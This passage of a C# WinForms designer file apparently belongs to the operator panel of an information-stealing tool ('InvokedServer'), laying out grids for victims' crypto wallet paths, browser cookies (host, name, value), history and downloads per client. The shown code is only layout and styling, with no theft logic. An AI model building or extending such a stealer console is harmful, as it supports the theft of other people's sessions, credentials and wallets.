            dataGridViewCellStyle22.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle22.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(90)))), ((int)(((byte)(92)))), ((int)(((byte)(120)))));
            dataGridViewCellStyle22.SelectionForeColor = System.Drawing.Color.White;
            this.StealerCryptoInfoDataGridView.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle22;
            this.StealerCryptoInfoDataGridView.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
            this.StealerCryptoInfoDataGridView.BackgroundColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerCryptoInfoDataGridView.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            dataGridViewCellStyle23.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle23.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            dataGridViewCellStyle23.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle23.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle23.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            dataGridViewCellStyle23.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
            dataGridViewCellStyle23.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.StealerCryptoInfoDataGridView.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle23;
            this.StealerCryptoInfoDataGridView.ColumnHeadersHeight = 20;
            this.StealerCryptoInfoDataGridView.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.dataGridViewTextBoxColumn18,
            this.dataGridViewTextBoxColumn28,
            this.dataGridViewTextBoxColumn29,
            this.dataGridViewTextBoxColumn30});
            dataGridViewCellStyle24.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle24.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            dataGridViewCellStyle24.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle24.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle24.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(90)))), ((int)(((byte)(92)))), ((int)(((byte)(120)))));
            dataGridViewCellStyle24.SelectionForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle24.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.StealerCryptoInfoDataGridView.DefaultCellStyle = dataGridViewCellStyle24;
            this.StealerCryptoInfoDataGridView.Dock = System.Windows.Forms.DockStyle.Fill;
            this.StealerCryptoInfoDataGridView.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
            this.StealerCryptoInfoDataGridView.GridColor = System.Drawing.Color.Black;
            this.StealerCryptoInfoDataGridView.Location = new System.Drawing.Point(0, 0);
            this.StealerCryptoInfoDataGridView.Name = "StealerCryptoInfoDataGridView";
            this.StealerCryptoInfoDataGridView.ReadOnly = true;
            this.StealerCryptoInfoDataGridView.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            this.StealerCryptoInfoDataGridView.RowHeadersVisible = false;
            this.StealerCryptoInfoDataGridView.RowHeadersWidthSizeMode = System.Windows.Forms.DataGridViewRowHeadersWidthSizeMode.DisableResizing;
            this.StealerCryptoInfoDataGridView.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.CellSelect;
            this.StealerCryptoInfoDataGridView.Size = new System.Drawing.Size(819, 95);
            this.StealerCryptoInfoDataGridView.TabIndex = 5;
            this.StealerCryptoInfoDataGridView.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerCryptoInfoDataGridView.ThemeStyle.AlternatingRowsStyle.Font = null;
            this.StealerCryptoInfoDataGridView.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.White;
            this.StealerCryptoInfoDataGridView.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
            this.StealerCryptoInfoDataGridView.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
            this.StealerCryptoInfoDataGridView.ThemeStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerCryptoInfoDataGridView.ThemeStyle.GridColor = System.Drawing.Color.Black;
            this.StealerCryptoInfoDataGridView.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.StealerCryptoInfoDataGridView.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            this.StealerCryptoInfoDataGridView.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.StealerCryptoInfoDataGridView.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.White;
            this.StealerCryptoInfoDataGridView.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
            this.StealerCryptoInfoDataGridView.ThemeStyle.HeaderStyle.Height = 20;
            this.StealerCryptoInfoDataGridView.ThemeStyle.ReadOnly = true;
            this.StealerCryptoInfoDataGridView.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerCryptoInfoDataGridView.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
            this.StealerCryptoInfoDataGridView.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.StealerCryptoInfoDataGridView.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.White;
            this.StealerCryptoInfoDataGridView.ThemeStyle.RowsStyle.Height = 22;
            this.StealerCryptoInfoDataGridView.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(231)))), ((int)(((byte)(229)))), ((int)(((byte)(255)))));
            this.StealerCryptoInfoDataGridView.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.White;
            // 
            // dataGridViewTextBoxColumn18
            // 
            this.dataGridViewTextBoxColumn18.FillWeight = 10.15228F;
            this.dataGridViewTextBoxColumn18.HeaderText = "Client";
            this.dataGridViewTextBoxColumn18.Name = "dataGridViewTextBoxColumn18";
            this.dataGridViewTextBoxColumn18.ReadOnly = true;
            // 
            // dataGridViewTextBoxColumn28
            // 
            this.dataGridViewTextBoxColumn28.FillWeight = 10.15228F;
            this.dataGridViewTextBoxColumn28.HeaderText = "Name";
            this.dataGridViewTextBoxColumn28.Name = "dataGridViewTextBoxColumn28";
            this.dataGridViewTextBoxColumn28.ReadOnly = true;
            // 
            // dataGridViewTextBoxColumn29
            // 
            this.dataGridViewTextBoxColumn29.FillWeight = 25F;
            this.dataGridViewTextBoxColumn29.HeaderText = "Path";
            this.dataGridViewTextBoxColumn29.Name = "dataGridViewTextBoxColumn29";
            this.dataGridViewTextBoxColumn29.ReadOnly = true;
            // 
            // dataGridViewTextBoxColumn30
            // 
            this.dataGridViewTextBoxColumn30.FillWeight = 10F;
            this.dataGridViewTextBoxColumn30.HeaderText = "Is File?";
            this.dataGridViewTextBoxColumn30.Name = "dataGridViewTextBoxColumn30";
            this.dataGridViewTextBoxColumn30.ReadOnly = true;
            // 
            // CookiesPage
            // 
            this.CookiesPage.AutoHiddenSlideSize = new System.Drawing.Size(200, 200);
            this.CookiesPage.Controls.Add(this.StealerCookiesDataGridView);
            this.CookiesPage.Flags = 65534;
            this.CookiesPage.ImageSmall = global::InvokedServer.Properties.Resources.flag_yellow;
            this.CookiesPage.LastVisibleSet = true;
            this.CookiesPage.MinimumSize = new System.Drawing.Size(50, 50);
            this.CookiesPage.Name = "CookiesPage";
            this.CookiesPage.Size = new System.Drawing.Size(819, 95);
            this.CookiesPage.StateCommon.Page.Color1 = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.CookiesPage.Text = "Cookies";
            this.CookiesPage.ToolTipTitle = "Page ToolTip";
            this.CookiesPage.UniqueName = "4DF5B0541D9446BF57814CE75DEE81F5";
            // 
            // StealerCookiesDataGridView
            // 
            this.StealerCookiesDataGridView.AllowUserToAddRows = false;
            this.StealerCookiesDataGridView.AllowUserToDeleteRows = false;
            this.StealerCookiesDataGridView.AllowUserToOrderColumns = true;
            this.StealerCookiesDataGridView.AllowUserToResizeColumns = false;
            this.StealerCookiesDataGridView.AllowUserToResizeRows = false;
            dataGridViewCellStyle25.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            dataGridViewCellStyle25.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle25.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(90)))), ((int)(((byte)(92)))), ((int)(((byte)(120)))));
            dataGridViewCellStyle25.SelectionForeColor = System.Drawing.Color.White;
            this.StealerCookiesDataGridView.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle25;
            this.StealerCookiesDataGridView.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
            this.StealerCookiesDataGridView.BackgroundColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerCookiesDataGridView.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            dataGridViewCellStyle26.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle26.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            dataGridViewCellStyle26.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle26.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle26.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            dataGridViewCellStyle26.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
            dataGridViewCellStyle26.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.StealerCookiesDataGridView.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle26;
            this.StealerCookiesDataGridView.ColumnHeadersHeight = 20;
            this.StealerCookiesDataGridView.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.dataGridViewTextBoxColumn6,
            this.dataGridViewTextBoxColumn7,
            this.dataGridViewTextBoxColumn9,
            this.dataGridViewTextBoxColumn16,
            this.dataGridViewTextBoxColumn17,
            this.ValueCol,
            this.dataGridViewTextBoxColumn19});
            dataGridViewCellStyle27.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle27.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            dataGridViewCellStyle27.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle27.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle27.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(90)))), ((int)(((byte)(92)))), ((int)(((byte)(120)))));
            dataGridViewCellStyle27.SelectionForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle27.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.StealerCookiesDataGridView.DefaultCellStyle = dataGridViewCellStyle27;
            this.StealerCookiesDataGridView.Dock = System.Windows.Forms.DockStyle.Fill;
            this.StealerCookiesDataGridView.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
            this.StealerCookiesDataGridView.GridColor = System.Drawing.Color.Black;
            this.StealerCookiesDataGridView.Location = new System.Drawing.Point(0, 0);
            this.StealerCookiesDataGridView.Name = "StealerCookiesDataGridView";
            this.StealerCookiesDataGridView.ReadOnly = true;
            this.StealerCookiesDataGridView.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            this.StealerCookiesDataGridView.RowHeadersVisible = false;
            this.StealerCookiesDataGridView.RowHeadersWidthSizeMode = System.Windows.Forms.DataGridViewRowHeadersWidthSizeMode.DisableResizing;
            this.StealerCookiesDataGridView.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.CellSelect;
            this.StealerCookiesDataGridView.Size = new System.Drawing.Size(819, 95);
            this.StealerCookiesDataGridView.TabIndex = 4;
            this.StealerCookiesDataGridView.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerCookiesDataGridView.ThemeStyle.AlternatingRowsStyle.Font = null;
            this.StealerCookiesDataGridView.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.White;
            this.StealerCookiesDataGridView.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
            this.StealerCookiesDataGridView.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
            this.StealerCookiesDataGridView.ThemeStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerCookiesDataGridView.ThemeStyle.GridColor = System.Drawing.Color.Black;
            this.StealerCookiesDataGridView.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.StealerCookiesDataGridView.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            this.StealerCookiesDataGridView.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.StealerCookiesDataGridView.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.White;
            this.StealerCookiesDataGridView.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
            this.StealerCookiesDataGridView.ThemeStyle.HeaderStyle.Height = 20;
            this.StealerCookiesDataGridView.ThemeStyle.ReadOnly = true;
            this.StealerCookiesDataGridView.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerCookiesDataGridView.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
            this.StealerCookiesDataGridView.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.StealerCookiesDataGridView.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.White;
            this.StealerCookiesDataGridView.ThemeStyle.RowsStyle.Height = 22;
            this.StealerCookiesDataGridView.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(231)))), ((int)(((byte)(229)))), ((int)(((byte)(255)))));
            this.StealerCookiesDataGridView.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.White;
            // 
            // dataGridViewTextBoxColumn6
            // 
            this.dataGridViewTextBoxColumn6.FillWeight = 10.15228F;
            this.dataGridViewTextBoxColumn6.HeaderText = "Client";
            this.dataGridViewTextBoxColumn6.Name = "dataGridViewTextBoxColumn6";
            this.dataGridViewTextBoxColumn6.ReadOnly = true;
            // 
            // dataGridViewTextBoxColumn7
            // 
            this.dataGridViewTextBoxColumn7.FillWeight = 10.15228F;
            this.dataGridViewTextBoxColumn7.HeaderText = "Browser/Profile";
            this.dataGridViewTextBoxColumn7.Name = "dataGridViewTextBoxColumn7";
            this.dataGridViewTextBoxColumn7.ReadOnly = true;
            // 
            // dataGridViewTextBoxColumn9
            // 
            this.dataGridViewTextBoxColumn9.FillWeight = 10.15228F;
            this.dataGridViewTextBoxColumn9.HeaderText = "Host";
            this.dataGridViewTextBoxColumn9.Name = "dataGridViewTextBoxColumn9";
            this.dataGridViewTextBoxColumn9.ReadOnly = true;
            // 
            // dataGridViewTextBoxColumn16
            // 
            this.dataGridViewTextBoxColumn16.FillWeight = 10.15228F;
            this.dataGridViewTextBoxColumn16.HeaderText = "Name";
            this.dataGridViewTextBoxColumn16.Name = "dataGridViewTextBoxColumn16";
            this.dataGridViewTextBoxColumn16.ReadOnly = true;
            // 
            // dataGridViewTextBoxColumn17
            // 
            this.dataGridViewTextBoxColumn17.FillWeight = 10.15228F;
            this.dataGridViewTextBoxColumn17.HeaderText = "Path";
            this.dataGridViewTextBoxColumn17.Name = "dataGridViewTextBoxColumn17";
            this.dataGridViewTextBoxColumn17.ReadOnly = true;
            // 
            // ValueCol
            // 
            this.ValueCol.FillWeight = 25F;
            this.ValueCol.HeaderText = "Value";
            this.ValueCol.Name = "ValueCol";
            this.ValueCol.ReadOnly = true;
            // 
            // dataGridViewTextBoxColumn19
            // 
            this.dataGridViewTextBoxColumn19.FillWeight = 10.15228F;
            this.dataGridViewTextBoxColumn19.HeaderText = "Expired";
            this.dataGridViewTextBoxColumn19.Name = "dataGridViewTextBoxColumn19";
            this.dataGridViewTextBoxColumn19.ReadOnly = true;
            // 
            // HistoryPage
            // 
            this.HistoryPage.AutoHiddenSlideSize = new System.Drawing.Size(200, 200);
            this.HistoryPage.Controls.Add(this.StealerHistoryDataGridView);
            this.HistoryPage.Flags = 65534;
            this.HistoryPage.ImageSmall = global::InvokedServer.Properties.Resources.flag_pink;
            this.HistoryPage.LastVisibleSet = true;
            this.HistoryPage.MinimumSize = new System.Drawing.Size(50, 50);
            this.HistoryPage.Name = "HistoryPage";
            this.HistoryPage.Size = new System.Drawing.Size(819, 95);
            this.HistoryPage.StateCommon.Page.Color1 = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.HistoryPage.Text = "History";
            this.HistoryPage.ToolTipTitle = "Page ToolTip";
            this.HistoryPage.UniqueName = "AC92F30B8DCC48FCA5899CA2285F1E8F";
            // 
            // StealerHistoryDataGridView
            // 
            this.StealerHistoryDataGridView.AllowUserToAddRows = false;
            this.StealerHistoryDataGridView.AllowUserToDeleteRows = false;
            this.StealerHistoryDataGridView.AllowUserToOrderColumns = true;
            this.StealerHistoryDataGridView.AllowUserToResizeColumns = false;
            this.StealerHistoryDataGridView.AllowUserToResizeRows = false;
            dataGridViewCellStyle28.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            dataGridViewCellStyle28.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle28.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(90)))), ((int)(((byte)(92)))), ((int)(((byte)(120)))));
            dataGridViewCellStyle28.SelectionForeColor = System.Drawing.Color.White;
            this.StealerHistoryDataGridView.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle28;
            this.StealerHistoryDataGridView.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
            this.StealerHistoryDataGridView.BackgroundColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerHistoryDataGridView.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            dataGridViewCellStyle29.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle29.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            dataGridViewCellStyle29.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle29.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle29.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            dataGridViewCellStyle29.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
            dataGridViewCellStyle29.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.StealerHistoryDataGridView.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle29;
            this.StealerHistoryDataGridView.ColumnHeadersHeight = 20;
            this.StealerHistoryDataGridView.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.dataGridViewTextBoxColumn31,
            this.dataGridViewTextBoxColumn32,
            this.dataGridViewTextBoxColumn34,
            this.dataGridViewTextBoxColumn35});
            dataGridViewCellStyle30.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle30.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            dataGridViewCellStyle30.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle30.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle30.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(90)))), ((int)(((byte)(92)))), ((int)(((byte)(120)))));
            dataGridViewCellStyle30.SelectionForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle30.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.StealerHistoryDataGridView.DefaultCellStyle = dataGridViewCellStyle30;
            this.StealerHistoryDataGridView.Dock = System.Windows.Forms.DockStyle.Fill;
            this.StealerHistoryDataGridView.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
            this.StealerHistoryDataGridView.GridColor = System.Drawing.Color.Black;
            this.StealerHistoryDataGridView.Location = new System.Drawing.Point(0, 0);
            this.StealerHistoryDataGridView.Name = "StealerHistoryDataGridView";
            this.StealerHistoryDataGridView.ReadOnly = true;
            this.StealerHistoryDataGridView.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            this.StealerHistoryDataGridView.RowHeadersVisible = false;
            this.StealerHistoryDataGridView.RowHeadersWidthSizeMode = System.Windows.Forms.DataGridViewRowHeadersWidthSizeMode.DisableResizing;
            this.StealerHistoryDataGridView.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.CellSelect;
            this.StealerHistoryDataGridView.Size = new System.Drawing.Size(819, 95);
            this.StealerHistoryDataGridView.TabIndex = 5;
            this.StealerHistoryDataGridView.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerHistoryDataGridView.ThemeStyle.AlternatingRowsStyle.Font = null;
            this.StealerHistoryDataGridView.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.White;
            this.StealerHistoryDataGridView.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
            this.StealerHistoryDataGridView.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
            this.StealerHistoryDataGridView.ThemeStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerHistoryDataGridView.ThemeStyle.GridColor = System.Drawing.Color.Black;
            this.StealerHistoryDataGridView.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.StealerHistoryDataGridView.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            this.StealerHistoryDataGridView.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.StealerHistoryDataGridView.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.White;
            this.StealerHistoryDataGridView.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
            this.StealerHistoryDataGridView.ThemeStyle.HeaderStyle.Height = 20;
            this.StealerHistoryDataGridView.ThemeStyle.ReadOnly = true;
            this.StealerHistoryDataGridView.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerHistoryDataGridView.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
            this.StealerHistoryDataGridView.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.StealerHistoryDataGridView.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.White;
            this.StealerHistoryDataGridView.ThemeStyle.RowsStyle.Height = 22;
            this.StealerHistoryDataGridView.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(231)))), ((int)(((byte)(229)))), ((int)(((byte)(255)))));
            this.StealerHistoryDataGridView.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.White;
            // 
            // dataGridViewTextBoxColumn31
            // 
            this.dataGridViewTextBoxColumn31.FillWeight = 10.15228F;
            this.dataGridViewTextBoxColumn31.HeaderText = "Client";
            this.dataGridViewTextBoxColumn31.Name = "dataGridViewTextBoxColumn31";
            this.dataGridViewTextBoxColumn31.ReadOnly = true;
            // 
            // dataGridViewTextBoxColumn32
            // 
            this.dataGridViewTextBoxColumn32.FillWeight = 10.15228F;
            this.dataGridViewTextBoxColumn32.HeaderText = "Browser/Profile";
            this.dataGridViewTextBoxColumn32.Name = "dataGridViewTextBoxColumn32";
            this.dataGridViewTextBoxColumn32.ReadOnly = true;
            // 
            // dataGridViewTextBoxColumn34
            // 
            this.dataGridViewTextBoxColumn34.FillWeight = 30F;
            this.dataGridViewTextBoxColumn34.HeaderText = "URL";
            this.dataGridViewTextBoxColumn34.Name = "dataGridViewTextBoxColumn34";
            this.dataGridViewTextBoxColumn34.ReadOnly = true;
            // 
            // dataGridViewTextBoxColumn35
            // 
            this.dataGridViewTextBoxColumn35.FillWeight = 20F;
            this.dataGridViewTextBoxColumn35.HeaderText = "Title";
            this.dataGridViewTextBoxColumn35.Name = "dataGridViewTextBoxColumn35";
            this.dataGridViewTextBoxColumn35.ReadOnly = true;
            // 
            // DownloadsPage
            // 
            this.DownloadsPage.AutoHiddenSlideSize = new System.Drawing.Size(200, 200);
            this.DownloadsPage.Controls.Add(this.StealerDownloadsDataGridView);
            this.DownloadsPage.Flags = 65534;
            this.DownloadsPage.ImageSmall = global::InvokedServer.Properties.Resources.flag_purple;
            this.DownloadsPage.LastVisibleSet = true;
            this.DownloadsPage.MinimumSize = new System.Drawing.Size(50, 50);
            this.DownloadsPage.Name = "DownloadsPage";
            this.DownloadsPage.Size = new System.Drawing.Size(819, 95);
            this.DownloadsPage.StateCommon.Page.Color1 = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.DownloadsPage.Text = "Downloads";
            this.DownloadsPage.ToolTipTitle = "Page ToolTip";
            this.DownloadsPage.UniqueName = "319D1160C6534C447E9E673A1A7B8E13";
            // 
            // StealerDownloadsDataGridView
            // 
            this.StealerDownloadsDataGridView.AllowUserToAddRows = false;
            this.StealerDownloadsDataGridView.AllowUserToDeleteRows = false;
            this.StealerDownloadsDataGridView.AllowUserToOrderColumns = true;
            this.StealerDownloadsDataGridView.AllowUserToResizeColumns = false;
            this.StealerDownloadsDataGridView.AllowUserToResizeRows = false;
            dataGridViewCellStyle31.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            dataGridViewCellStyle31.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle31.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(90)))), ((int)(((byte)(92)))), ((int)(((byte)(120)))));
            dataGridViewCellStyle31.SelectionForeColor = System.Drawing.Color.White;
            this.StealerDownloadsDataGridView.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle31;
